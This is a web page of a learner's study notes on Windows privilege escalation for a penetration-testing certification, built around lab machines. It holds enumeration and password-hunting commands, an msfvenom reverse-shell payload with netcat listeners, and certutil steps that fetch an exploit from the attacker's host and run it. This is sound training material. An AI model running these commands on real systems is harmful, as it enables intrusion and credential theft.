<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>5 - Windows Privilege Escalation |</title>
<meta name="description" content="Navigating Windows Privesc Techniques: Kernel Exploits, Impersonation, Registry, DLL Hijacking and More ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="5 - Windows Privilege Escalation">
<meta property="og:url" content="http://localhost:4000/notes/pnpt/winprivesc/">


  <meta property="og:description" content="Navigating Windows Privesc Techniques: Kernel Exploits, Impersonation, Registry, DLL Hijacking and More ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header2.jpg">





  <meta property="article:published_time" content="2023-11-27T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/pnpt/winprivesc/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header2.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          5 - Windows Privilege Escalation

        
      </h1>
      
        <p class="page__lead">Elevate and Conquer: Windows Privilege Escalation Strategies.
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  15 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/" class="active">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="5 - Windows Privilege Escalation">
    <meta itemprop="description" content="Elevate and Conquer: Windows Privilege Escalation Strategies.">
    <meta itemprop="datePublished" content="2023-11-27T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#initial-enumeration">Initial Enumeration</a>
    <ul>
      <li><a href="#system-enumeration">System Enumeration</a></li>
      <li><a href="#user-enumeration">User Enumeration</a></li>
      <li><a href="#network-enumeration">Network Enumeration</a></li>
      <li><a href="#password-enumeration">Password Enumeration</a></li>
      <li><a href="#av-enumeration">AV Enumeration</a></li>
    </ul>
  </li>
  <li><a href="#automated-tools">Automated Tools</a>
    <ul>
      <li><a href="#tools-for-enumeration">Tools for enumeration</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-kernel-exploits">Escalation Path: Kernel Exploits</a>
    <ul>
      <li><a href="#kernel">Kernel</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-passwords-and-port-forwarding">Escalation Path: Passwords and Port Forwarding</a>
    <ul>
      <li><a href="#chatterbox---hack-the-box">chatterbox - hack-the-box</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-windows-subsystem-for-linux">Escalation Path: Windows Subsystem for Linux</a>
    <ul>
      <li><a href="#overview">Overview</a></li>
    </ul>
  </li>
  <li><a href="#impersonation-and-potato-attacks">Impersonation and Potato Attacks</a>
    <ul>
      <li><a href="#what-are-tokens">What are tokens?</a></li>
      <li><a href="#jeeves-htb">Jeeves htb</a></li>
      <li><a href="#escalation">Escalation</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-getsystem">Escalation Path: getsystem</a></li>
  <li><a href="#escalation-path-runas">Escalation Path: RunAs</a>
    <ul>
      <li><a href="#overview-1">Overview</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-registry">Escalation Path: Registry</a>
    <ul>
      <li><a href="#overview-of-autoruns">Overview of Autoruns</a></li>
      <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a></li>
      <li><a href="#regsvc-acl-overview">Regsvc ACL Overview</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-executable-files">Escalation Path: Executable Files</a>
    <ul>
      <li><a href="#detection-1">Detection</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-startup-application">Escalation Path: Startup Application</a>
    <ul>
      <li><a href="#overview-3">Overview</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-dll-hijacking">Escalation Path: DLL Hijacking</a>
    <ul>
      <li><a href="#dll-hijacking-overview">DLL Hijacking Overview</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-service-permissions">Escalation Path: Service Permissions</a>
    <ul>
      <li><a href="#escalation-via-binary-paths">Escalation via Binary Paths</a></li>
      <li><a href="#unquoted-service-paths">Unquoted Service Paths</a></li>
      <li><a href="#steelmountain-from-tryhackme">SteelMountain from TryHackMe</a></li>
    </ul>
  </li>
  <li><a href="#escalation-path-cve-2019-1388">Escalation Path: CVE-2019-1388</a>
    <ul>
      <li><a href="#overview-4">Overview</a></li>
    </ul>
  </li>
  <li><a href="#capstone">Capstone</a>
    <ul>
      <li><a href="#arctic">Arctic</a></li>
      <li><a href="#bastard">Bastard</a></li>
      <li><a href="#alfred">Alfred</a></li>
      <li><a href="#bastion">Bastion</a></li>
      <li><a href="#querier">Querier</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<p><strong>Resources</strong>:</p>

<p>THM :https://tryhackme.com/room/windowsprivescarena</p>

<p>Git: https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources</p>

<p>Fuzzy Security Guide:  https://www.fuzzysecurity.com/tutorials/16.html</p>

<p>PayloadsAllTheThings Guide: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</p>

<p>Absolomb Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</p>

<p>Sushant 747’s Guide (Country dependant - may need VPN): https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</p>

<h1 id="initial-enumeration">Initial Enumeration</h1>

<h2 id="system-enumeration">System Enumeration</h2>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">getuid</span><span class="w">
</span><span class="nx">sysinfo</span><span class="w">
</span></code></pre></div></div>

<p>in Windows:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">systeminfo</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">/C:</span><span class="w"> </span><span class="s2">"OS Name"</span><span class="w"> </span><span class="nx">/C:</span><span class="w"> </span><span class="s2">"OS Version"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"System Type"</span><span class="w">

</span><span class="c"># wmic ( windows manager instrumentation command line ) </span><span class="w">
</span><span class="c"># qfe ( quick fix engineering ) </span><span class="w">
</span><span class="c"># to see whats patched</span><span class="w">

</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Caption</span><span class="p">,</span><span class="nx">Description</span><span class="p">,</span><span class="nx">HotFixID</span><span class="p">,</span><span class="nx">InstalledOn</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">logicaldisk</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">caption</span><span class="p">,</span><span class="nx">description</span><span class="p">,</span><span class="nx">providername</span><span class="w">
</span></code></pre></div></div>

<h2 id="user-enumeration">User Enumeration</h2>

<p>in Windows:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w">
</span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">specific</span><span class="w"> </span><span class="nx">user</span><span class="err">&gt;</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<h2 id="network-enumeration">Network Enumeration</h2>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">
</span><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">
</span></code></pre></div></div>

<h2 id="password-enumeration">Password Enumeration</h2>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">looks</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="nx">directory</span><span class="err">&gt;</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span><span class="o">%</span><span class="n">WINDIR</span><span class="o">%</span><span class="nx">\Panther\Unattend\Unattended.xml</span><span class="w">
</span><span class="o">%</span><span class="n">WINDIR</span><span class="o">%</span><span class="nx">\Panther\Unattended.xml</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">c:\</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="o">*</span><span class="nx">vnc.ini</span><span class="w">
</span></code></pre></div></div>

<h2 id="av-enumeration">AV Enumeration</h2>

<p>Service controller:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">windefend</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">queryex</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="w"> </span><span class="n">service</span><span class="w">
</span></code></pre></div></div>

<p>Firewall:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">dump</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">state</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">config</span><span class="w">
</span></code></pre></div></div>

<h1 id="automated-tools">Automated Tools</h1>

<p>WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</p>

<p>Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</p>

<p>Sherlock - https://github.com/rasta-mouse/Sherlock</p>

<p>Watson - https://github.com/rasta-mouse/Watson</p>

<p>PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</p>

<p>JAWS - https://github.com/411Hall/JAWS</p>

<p>Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>

<p>Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/</p>

<p>Seatbelt - https://github.com/GhostPack/Seatbelt</p>

<p>SharpUp - https://github.com/GhostPack/SharpUp</p>

<h2 id="tools-for-enumeration">Tools for enumeration</h2>

<p>Executables:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winpeas.exe</span><span class="w">
</span><span class="nx">Seatbelt.exe</span><span class="w"> </span><span class="p">(</span><span class="n">compile</span><span class="p">)</span><span class="w">
</span><span class="n">Watson.exe</span><span class="w"> </span><span class="p">(</span><span class="n">compile</span><span class="p">)</span><span class="w">
</span><span class="n">SharpUp.exe</span><span class="w"> </span><span class="p">(</span><span class="n">compile</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>PowerShell:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Sherlock.ps1</span><span class="w">
</span><span class="nx">PowerUp.ps1</span><span class="w">
</span><span class="n">jaws-enum.ps1</span><span class="w">
</span></code></pre></div></div>

<p>Other:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">windows-exploit-suggester.py</span><span class="w"> </span><span class="p">(</span><span class="n">local</span><span class="p">)</span><span class="w">
</span><span class="n">exploit</span><span class="w"> </span><span class="nx">suggester</span><span class="w"> </span><span class="p">(</span><span class="n">metasploit</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<h3 id="executing">Executing</h3>

<p>in Metasploit:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">c:\\windows\\temp</span><span class="w">
</span><span class="n">upload</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">path/winpeas.exe</span><span class="err">&gt;</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">powershell</span><span class="w">
</span><span class="n">run</span><span class="w"> </span><span class="nx">post/multi/recon/local_exploit_suggester</span><span class="w">
</span></code></pre></div></div>

<p>in shell:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="n">powerup.ps1</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>if powershell and winpeas are not avaiable to use</p>
</blockquote>

<p>in Kali:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><span class="w">
</span><span class="o">.</span><span class="n">/windows-exploit-suggester.py</span><span class="w"> </span><span class="nt">--update</span><span class="w">
</span><span class="n">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">xlrd</span><span class="w"> </span><span class="nt">--upgrade</span><span class="w">

</span><span class="c"># 'if u dont have pip' &gt; curl http://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py</span><span class="w">
</span><span class="o">.</span><span class="n">/windows-exploit-suggester.py</span><span class="w"> </span><span class="nt">--database</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">db.xls</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--systeminfo</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">sysinfo</span><span class="w"> </span><span class="nx">file</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<h1 id="escalation-path-kernel-exploits">Escalation Path: Kernel Exploits</h1>

<p>Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits</p>

<h2 id="kernel">Kernel</h2>
<ul>
  <li>Is a computer program that controls everything in the system</li>
  <li>Facilitates interactions between hardware and software components</li>
  <li>A translator</li>
</ul>

<h3 id="in-metasploit">In metasploit</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>after run suggester / winpeas / powerup, we have an idea which kernel exploits we can try
background the session
so we search in metasploit example: exploit/windows/local/ms10_015_kitrap0d
set options &gt; run
</code></pre></div></div>

<h3 id="manually">Manually</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nv">lport</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> aspx <span class="o">&gt;</span> shell.aspx
nc <span class="nt">-lvnp</span> &lt;port&gt; <span class="o">=</span> <span class="nb">set </span>a listener	

<span class="c"># MS10-059 Exploit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059</span>
</code></pre></div></div>

<blockquote>
  <p>transfer the exploit to the windows target machine</p>
</blockquote>

<p>in kali:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span> 
</code></pre></div></div>

<p>in windows:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">c:\Windows\Temp</span><span class="w">
</span><span class="n">certutil</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">file</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">output</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span><span class="n">exploit.exe</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>in kali:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;port&gt;
</code></pre></div></div>

<blockquote>
  <p>run &amp; get root access</p>
</blockquote>

<h1 id="escalation-path-passwords-and-port-forwarding">Escalation Path: Passwords and Port Forwarding</h1>

<h2 id="chatterbox---hack-the-box">chatterbox - hack-the-box</h2>
<p>Achat Exploit - https://www.exploit-db.com/exploits/36025</p>

<p>Achat Exploit (Metasploit) - https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof</p>

<p>We can modify the payload to shell_reverse_tcp and add lhost, lport and set new target ip</p>

<p>Fire the msfvenom again after the modifications and change the payload:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- open a listener = netcat
- run the exploit
</code></pre></div></div>

<h3 id="enum">Enum</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">systeminfo</span><span class="w">
</span><span class="nx">net</span><span class="w"> </span><span class="nx">users</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w">
</span><span class="n">ipconfig</span><span class="w">
</span><span class="nx">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">
</span></code></pre></div></div>

<h3 id="hunting-passwords">Hunting passwords</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<p>If a password shows here, we can copy the register path of the file to show more info:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ref</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">reg</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">pwd</span><span class="w"> </span><span class="nx">found</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>Got username and a password</p>
</blockquote>

<p>Here we need to think the available options:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- is ssh open?
- is smb available? so we can use psexec attack?
- perhaps password reuse?
</code></pre></div></div>

<h3 id="port-forwarding">Port Forwarding</h3>
<p>Plink Download - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</p>

<p>Download plink with the same version of your target</p>

<p>Send the file to the target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># open a python server
# receive the file

certutil -urlcache -f http://&lt;kali ip&gt;/&lt;file&gt; &lt;output name&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- modify the /etc/sshd_config
- set PermitRootLogin yes
- service ssh restart
- service ssh start
</code></pre></div></div>

<p>in Target:</p>
